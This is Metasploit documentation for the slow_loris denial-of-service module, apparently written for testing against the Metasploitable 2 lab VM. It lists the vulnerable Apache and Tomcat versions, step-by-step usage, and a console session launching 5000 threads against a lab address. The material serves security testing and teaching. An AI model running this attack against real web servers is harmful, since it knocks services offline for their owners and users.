## Vulnerable Application

This module tries to keep many connections to the target web server open and hold them open as long as possible.

Vulnerable app versions include:

- Apache HTTP Server 1.x and 2.x
- Apache Tomcat 5.5.0 through 5.5.29, 6.0.0 through 6.0.27 and 7.0.0 beta

Download the Metasploitable 2 vulnerable Linux virtual machine from [https://sourceforge.net/projects/metasploitable/files/Metasploitable2/](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/).

## Verification Steps

1. Start msfconsole
2. Do: use auxiliary/dos/http/slow_loris
3. Do: set RHOST
4. Do: run
5. Visit server URL in your web-browser.

## Scenarios

### Apache/2.2.8 - Ubuntu 8.04

```
msf > use auxiliary/dos/http/slow_loris.rb
msf auxiliary(slow_loris) > show options 

Module options (auxiliary/dos/http/slow_loris):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST    192.168.216.129  yes       The target address
   RPORT    80               yes       The target port (TCP)
   THREADS  5000             yes       The number of concurrent threads
   TIMEOUT  60               yes       The maximum time in seconds to wait for each request to finish

msf auxiliary(slow_loris) > set RHOST 192.168.216.129
RHOST => 192.168.216.129
msf auxiliary(slow_loris) > run

[*] 192.168.216.129:80 - Executing requests 1 - 5000...

```
